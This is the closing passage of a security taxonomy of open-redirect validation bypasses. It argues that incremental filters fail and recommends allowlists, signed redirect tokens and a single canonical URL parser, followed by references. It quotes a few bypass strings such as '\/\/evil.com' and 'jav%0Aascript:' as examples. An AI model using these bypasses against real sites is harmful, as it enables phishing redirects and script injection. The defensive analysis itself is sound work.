Incremental patches fail because **each fix addresses a specific encoding or structural trick without closing the underlying validation gap**. Blocking `//evil.com` does not prevent `\/\/evil.com`; blocking `javascript:` does not prevent `jav%0Aascript:`; validating the `Host` header does not prevent `X-Forwarded-Host` injection. The mutation space documented in this taxonomy demonstrates that for every validation check, multiple bypass techniques exist across encoding (§5), protocol (§1), authority (§2), path (§3), and parser differential (§8) dimensions. The shift from server-side to client-side redirects (§6-3) has further expanded the attack surface, with NDSS 2025 research confirming that DOM-based open redirects now affect nearly 9% of the top 10K websites, with significant escalation potential to XSS and CSRF.

A structural solution requires **treating redirect targets as opaque, validated tokens rather than user-supplied URLs**. This means: (1) maintaining an allowlist of exact redirect destinations or using signed/encrypted redirect tokens; (2) performing URL validation *after* full normalization using the *same parser* the redirect mechanism uses; (3) for DOM-based redirects, never passing user input directly to navigation sinks (`location.href`, `location.replace()`, `window.open()`) — instead mapping user input to pre-defined routes; and (4) eliminating the validator-vs-consumer parser split (§8-3) by ensuring a single canonical URL parser is used throughout the entire validation-and-redirect pipeline.

---

## References

- OWASP Unvalidated Redirects and Forwards Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
- CWE-601: URL Redirection to Untrusted Site — https://cwe.mitre.org/data/definitions/601.html
- PortSwigger URL Validation Bypass Cheat Sheet (2024 Edition) — https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
- PortSwigger DOM-Based Open Redirection — https://portswigger.net/web-security/dom-based/open-redirection
- HackTricks Open Redirect — https://book.hacktricks.wiki/en/pentesting-web/open-redirect.html
- PayloadsAllTheThings Open Redirect — https://swisskyrepo.github.io/PayloadsAllTheThings/Open%20Redirect/
- Intigriti Open URL Redirect Advanced Exploitation Guide — https://www.intigriti.com/researchers/blog/hacking-tools/open-url-redirects-a-complete-guide-to-exploiting-open-url-redirect-vulnerabilities
- Claroty: Exploiting URL Parsing Confusion — https://claroty.com/team82/research/exploiting-url-parsing-confusion
- Sonar: Security Implications of URL Parsing Differentials — https://www.sonarsource.com/blog/security-implications-of-url-parsing-differentials/
- NDSS 2025: Do (Not) Follow the White Rabbit: Challenging the Myth of Harmless Open Redirection — https://www.ndss-symposium.org/ndss-paper/do-not-follow-the-white-rabbit-challenging-the-myth-of-harmless-open-redirection/
- STORK Framework (GitHub) — https://github.com/SoheilKhodayari/STORK
- CVE-2024-29041 (Express.js) — https://github.com/advisories/GHSA-rv95-896h-c2vc
- CVE-2025-4123 (Grafana) — https://grafana.com/blog/grafana-security-release-medium-and-high-severity-security-fixes-for-cve-2025-4123-and-cve-2025-3580/
- PortSwigger URL Cheat Sheet Data Repository — https://github.com/PortSwigger/url-cheatsheet-data
- EdOverflow Bug Bounty Cheatsheet: Open Redirect — https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/open-redirect.md

---

*This document was created for defensive security research and vulnerability understanding purposes.*
